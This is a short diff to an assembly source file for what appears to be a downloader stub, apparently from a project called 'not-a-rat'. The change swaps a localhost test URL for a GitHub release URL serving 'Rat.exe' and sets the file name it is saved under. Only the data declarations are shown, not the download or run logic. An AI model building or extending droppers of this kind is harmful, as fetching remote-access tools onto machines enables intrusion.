@@ -56,10 +56,10 @@
 
     ; test with local web server in repo (python3 -m http.server)
     ; downloadUrl   db "http://localhost:8000/x64/Debug/Rat.exe", 0
-    downloadUrl    db "http://localhost:8000/x64/Release/Rat.exe", 0
-    fileName       db "\\test\\Rat.exe", 0
+    ; downloadUrl    db "http://localhost:8000/x64/Release/Rat.exe", 0
 
-    ; TODO: replace paths with github link
+    downloadUrl    db "https://github.com/barrettotte/not-a-rat/releases/download/v1/Rat.exe?raw=true", 0
+    fileName       db "\\Rat.exe", 0
     
     hInternet      dd 0                    ; handle to internet connection
     hConnect       dd 0                    ; handle to opened URL
